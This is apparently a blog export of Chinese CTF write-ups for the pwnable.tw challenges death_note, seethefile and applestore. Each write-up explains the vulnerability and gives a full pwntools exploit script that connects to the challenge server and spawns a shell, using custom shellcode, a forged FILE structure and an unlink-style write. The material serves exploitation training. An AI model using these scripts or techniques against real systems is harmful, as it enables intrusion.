1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691.数据传送:push/pop eax…pusha/popa2.算术运算:inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]3.逻辑运算:and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]4.比较指令:cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]5.转移指令:push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable6.交换al, ahpush eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax7.清零:push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 可以先看一下，执行shellcode时的寄存器状况： 根据如上的寄存器情况，shellcode可以写成这样： 12345678910111213141516171819202122232425262728293031323334shellcode = ''' /* execve(path='/bin///sh', argv=0, envp=0) */ /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx /*rewrite shellcode to get 'int 80'*/ push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl /*set zero to edx*/ push ecx pop edx /*set 0x0b to eax*/ push edx pop eax xor al, 0x40 xor al, 0x4b /*foo order,for holding the place*/ push edx pop edx push edx pop edx'''shellcode = asm(shellcode) + '\x6b\x40' EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *debug = 1elf = ELF('./death_note')if debug: p = process('./death_note') context.log_level = 'debug' gdb.attach(p,'b *0x80487ef')else: p = remote('chall.pwnable.tw', 10201)def add(p,index,s): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index :') p.sendline(index) p.recvuntil('Name :') p.sendline(s)bss = 0x804a060puts_got = elf.got['puts']print hex(puts_got)offset = (puts_got - bss)/4#'''shellcode = shellcraft.sh()print len(asm(shellcode))print hex(asm(shellcode))'''shellcode = ''' /* execve(path='/bin///sh', argv=['sh'], envp=0) */ /* push '/bin///sh\x00' */ push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx push edx pop eax push 0x60606060 pop edx sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x35] , dl sub byte ptr[eax + 0x34] , dl push 0x3e3e3e3e pop edx sub byte ptr[eax + 0x34] , dl push ecx pop edx push edx pop eax xor al, 0x40 xor al, 0x4b push edx pop edx push edx pop edx'''print hex(len(asm(shellcode)))shellcode = asm(shellcode) + '\x6b\x40'add(p,str(offset),shellcode)p.interactive()]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 seethefile 解题思路]]></title>
    <url>%2F2017%2F09%2F20%2Fpwnable-tw-seethefile%2F</url>
    <content type="text"><![CDATA[题目功能main函数中一共4个功能，openfile、readfile、writefile、closefile。 其中，在最后退出时有一个明显的溢出，是scanf(“%s”,&amp;name); name位于bss段上，name下面有一个fp用于存储文件指针，可以被覆盖。 再看其他函数： openfile.只有一个简单的输入并打开，保存文件指针在bss段上的fp变量中： readfile,从fp所指的文件中每次读取0x18F字节字节到magicbuf中，这个变量也在bss段上。 writefile无法读取含有flag、FLAG、}的字符串，是一个打印函数 漏洞利用由于无法覆盖栈上内容，仅能覆盖bss段上空间，因此想法是覆盖fp指针，通过伪造fp指针进一步利用，这种利用方法在如下文章中已经给出： http://www.evil0x.com/posts/13764.html 另外一个重要的点在于libc的泄露。 由于linux独特的文件形式存储，文件的内存信息存储与/proc/pid/maps中，这里pid使用self来代替，如下图： 因此libc可以通过该方式泄露。 伪造file指针的过程，可以通过上面的链接中大致了解，最终的步骤是构造file对象的内容，由于最终要执行fclose(fp)，这一函数，而fclose中用户可控的函数指针执行位置在fclose如下位置， 因此必须要使fclose执行到该位置，其决定性作用的是前2个字节，可以通过动态调试来获得，将fclose(fp)，转化为system（fp），而fp的前两个字节有太重要的作用，建议不要动。 可以用’||/bin/sh’的方法执行获得shell。 至于前两个字节的调试，需要通过动态调试fclose的方法一步一步来找。 捷径的方法是用链接中给到用stderr内容来最初构建。 另外，题目中的输入方法是可以输入\x00的，算是个福利吧。 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *debug = 0elf = ELF('./seethefile')if debug: p = process('./seethefile') libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p)else: p = remote('chall.pwnable.tw', 10200) libc = ELF('./libc_32.so.6') #off = 0x001b0000p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('What do you want to see :')p.sendline('/proc/self/maps')p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Your choice :')p.sendline('2')p.recvuntil('Your choice :')p.sendline('3')cache = p.recvuntil('Your choice :')cache_part = cache.split('\n')libc_start_addr = 0for i in cache_part: if 'libc' in i: libc_start_addr = int(i[0:8],16) breakif libc_start_addr == 0: print '[-] didnot find libc addr. exit' exit(0)system_libc = libc.symbols['system']system_libc_addr = libc_start_addr + system_libclog.success('find system:'+hex(system_libc_addr))p.sendline('5')p.recvuntil('Leave your name :')#gdb.attach(p,'b *0x8048b04')start =0x8048a37 # elf.symbols['puts']#fake_file_start = 0x804b280+0x4fake_file_jmp = fake_file_start + 180padding = 'p4nda'padding = padding.ljust(0x20,'!') + p32(fake_file_start)bin_sh = '||/bin/sh'start = system_libc_addrexp_back_main = '\x86\xb4\xad\xfb'+bin_sh+'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x8d\x6b\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x64\x98\x6b\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x24\x84\x6b\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'exp_back_main = exp_back_main.ljust(180,'b') print len(exp_back_main)exp_back_main+= p32(start)*15 + p32(start)*8p.sendline(padding + exp_back_main)p.recvuntil('see you next time')p.sendline('cd /home/seethefile/')p.sendline('./get_flag')p.recvuntil('magic :')p.sendline('Give me the flag\0')p.interactive()#backup#exp_back_main = '\x86\xb4\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x8d\x6b\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x64\x98\x6b\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x24\x84\x6b\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'#'\x00\x00\x00\x00\x00\x00\x00\x00\x00'#dustbin#exp_back_main = '\x86\x21\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x21\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x60\xb2\x04\x08\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA'+p32(fake_file_jmp)#0804B260#exp_back_main = '\x86\x91\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x21\xba\x04\x08\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x60\xb2\x04\x08\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x60\xb2\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+p32(fake_file_jmp)+'\x00\x00\x00\x00\x00\x00\x00\x00'#exp_back_main = p32(fake_file_start) * 0x11 + 'aa' + '\x04' + 'a' + p32(fake_file_jmp) * 0x13 + p32(fake_file_jmp) * 2]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 applestore 解题思路]]></title>
    <url>%2F2017%2F09%2F14%2Fpwnable-tw-applestore%2F</url>
    <content type="text"><![CDATA[做到这道题的时候正赶上iPhone 8上市，撒花~（虽然不知道为啥） 题目功能先进到main函数，比较简单。 myCart位于bss段上，是一个长度为0x10。 主要的处理函数是handler函数： 这是一个标准的菜单类题目。挨个函数看下去 list： 这个是各种手机的价格，什么都没有。 再看第二个函数： 这个函数是一个添加购物车的函数，具体采用my_read函数，得到用户输入的商品号，然后用atoi函数进行判断。 my_read函数中存在一个问题，在read部分中以\0分割可以输入其他内容到栈上，并不影响运行结果，因为atoi函数是以\0为分割的。 再看create函数： 先malloc了一块空间，并返回，内容先不说。然后再看insert函数，首先在myCart上寻找，找到第3个字节为0的就将上面malloc的内存挂在上面。 当malloc、insert许多内存块后，大致就形成了链表。 delete函数 首先还是使用my_read函数，接受用户输入，根据输入判断删除的位置，进一步将被删除的内存块从链表中摘除，摘除的操作类似于smallbins的unlink操作。 cart函数，这是一个遍历链表并打印的过程，一遍来说，内存数据泄露都出现在这样的函数中。 checkout函数，这是一个结账函数，但是并不是真的结账，无论选择多少东西，函数都会告诉你下次结账吧。不过这里存在一个彩蛋，当选择商品的总价为7174时，会以1美元的价格在购物车里添加一台iPhone8. 漏洞分析位置就是在上面赠送的iPhone 8处，所谓的Free is the most expensive。 之前选择的商品都使用了malloc为商品创建了一块内存，但最后这个用了栈内的一块空间，距离ebp-2c个字节。 有了这点还不够，需要查看这块栈地址是否能被我们利用。 在其他函数中，距离ebp -0x20的位置都可以被用户自己修改。如， 以上位置，再加上my_read中的bug（上文提到的），就可以修改iPhone 8 内存块的任意结构了。 漏洞利用首先是7174价格的构造，简单的方法，所有的价格都以99结尾，然后价格以4结尾，总数应该是6台，所以尝试用19926 + 100 * 20 = 7174。即 6台 iPhone6 + 20台 iPhone 6s可以构造。 如此可以得到第27块是栈里的一块。 libc地址泄露在之前说过的，cart函数一般是地址泄露重要的突破点，这个也不例外，可以看到函数逻辑中，在打印部分是顺序遍历链表，若i+8不为空，就打印下一块的i，i+4部分： 前面构造的26块很正常，当第27块构造成如下结构时，即可泄露函数地址： 在用户输入时，别忘了buf是从-22开始的，即前面还有两个自己，这两个字节恰好填充为 “y\0” 如此便可泄露libc地址： 泄露堆地址仅仅泄露一个libc是不够的，还需要更多数据。 这个地址可以使用bss段上的myCart来泄露，因为bss端地址已知，其次myCart是链表头，具体可将内存块构造成如下这样： 同样，不要忘记前面的“y\0” 泄露stack地址上面可以得到第一块malloc得到堆的地址。一定有这样的疑惑，有了第一块堆的地址，通过计算26次malloc(0x10)就可以计算出第26块的地址，才利用上面的方法泄露，不就可以得出了第26块上 i+8的地址了吗？（栈上地址） 最开始就是这么写的，但是实际跑的时候发现并没有这样分配，没有特别多的规律，所以我采用了每次得到下一块堆块的地址，然后泄露其i+8内容，不断迭代得到最后的栈地址。 以上就得到了全部的地址。如果有人知道为啥堆分配不是顺次+ 0x18的请告诉我 仅仅泄露堆栈等地址貌似没什么用，必须找到可以篡改的地方。 Dword shoot DWORD SHOOT是堆漏洞的一个名词，意思是可以精确覆盖一个双字节地址的漏洞，常见的就是unlink漏洞。 上面说过，删除购物车里货物的方式类似于堆的unlink，因此存在的漏洞也类似于unlink的漏洞。 当我们修改第27块iPhone 8的后8字节时，对其进行删除就会有个DWORD SHOOT漏洞。 该漏洞如何利用呢？ 覆写一般的地址会有一个四字节的副作用产生，因此常见的利用方法是覆盖下两层函数的ebp，进一步控制esp，控制eip。 详细的原理可以参考之前我写的一篇关于pwnable.kr中的unlink题目： http://www.cnblogs.com/p4nda/p/7172104.html 利用思路是覆盖ebp，控制esp，控制eip，可参看这一篇：http://www.cnblogs.com/p4nda/p/7280520.html 第27块堆块的内容如下： 这次前面两位填写“27” 关键就在于如何构造stack_addr地址，必须找到一块我们可以覆写的内存，且在main函数结束之前不被破坏。这里我选择的在handler函数中的nptr块， 将其构造为： 由于会在main函数退出时执行system(‘/bin/sh’)，因此前两位填写“6\0”,使函数退出。 在这里还踩过一个坑在于使用子函数如cart内的nptr作为fake steak，但是不可以，有耐心的可以自行调一下为啥~ EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *debug = 0elf = ELF('./applestore')if debug: p = process('./applestore') libc = ELF('./libc.local.so') #off = 0x001b2000 context.log_level = 'debug' # gdb.attach(p)else: p = remote('chall.pwnable.tw', 10104) libc = ELF('./libc_32.so.6') #off = 0x001b0000for i in range(6): p.recvuntil("&gt;") p.sendline('2') p.recvuntil("Device Number&gt;") p.sendline('1')for i in range(20): p.recvuntil("&gt;") p.sendline('2') p.recvuntil("Device Number&gt;") p.sendline('2')p.recvuntil('&gt;')p.sendline('5')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline('y')if 'iPhone 8' in p.recvuntil('&gt;'): log.success('got iPhone 8')#leaklibcnum = 'y\0'read_got = elf.got['read']price = 0next_phone = 0last_phone = 0xdeadbeefleak = 'y'leak = flat(num,read_got,price,next_phone,last_phone)print len(leak),' : ', leakp.sendline('4')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline(leak)p.recvuntil('27: ')read_libc_addr = u32(p.recv(4))if read_libc_addr &gt; 0xf7000000: log.success('got read addr:'+hex(read_libc_addr))system_libc = libc.symbols['system']bin_sh_libc = next(libc.search('/bin/sh'))read_libc = libc.symbols['read']system_libc_addr = system_libc + read_libc_addr - read_libcbin_sh_libc_addr = bin_sh_libc + read_libc_addr - read_libc#leakheap#gdb.attach(p,'b *0x8048b03')p.recvuntil('&gt;')num = 'y\0'read_got = 0x804b070price = 0next_phone = 0last_phone = 0xdeadbeefleak = 'y'leak = flat(num,read_got,price,next_phone,last_phone)print len(leak),' : ', leakp.sendline('4')p.recvuntil('Let me check your cart. ok? (y/n) &gt;')p.sendline(leak)p.recvuntil('27: ')heap_addr = u32(p.recv(4))print '[+]heap: ',hex(heap_addr)#leak_stackstack_p = log.progress('pass')for i in range(26): p.recvuntil('&gt;') num = 'y\0' read_got = heap_addr+8 price = 0 next_phone = 0 last_phone = 0xdeadbeef leak = 'y' leak = flat(num,read_got,price,next_phone,last_phone) print len(leak),' : ', leak p.sendline('4') p.recvuntil('Let me check your cart. ok? (y/n) &gt;') p.sendline(leak) p.recvuntil('27: ') heap_addr = u32(p.recv(4)) print '[+]stack: ',hex(heap_addr) stack_p.status('stack' + hex(heap_addr))stack_addr = heap_addrp.success('find stack addr:'+hex(stack_addr))#dword shootebp_addr = stack_addr + 0x20 + 0x40num = '27'dword_shoot_exp = flat(num,0,0,stack_addr+64,ebp_addr-8)print len(dword_shoot_exp),":",dword_shoot_expp.recvuntil('&gt;')p.sendline('3')p.recvuntil('Number&gt;')#gdb.attach(p)p.sendline(dword_shoot_exp)'''#put system into stackp.recvuntil('&gt;')'''#exitnum = '6\0'esp = 0xdeadbeefexp = flat(num,esp,system_libc_addr,esp,bin_sh_libc_addr)p.recvuntil('&gt;')p.sendline(exp)p.interactive()]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
</search>
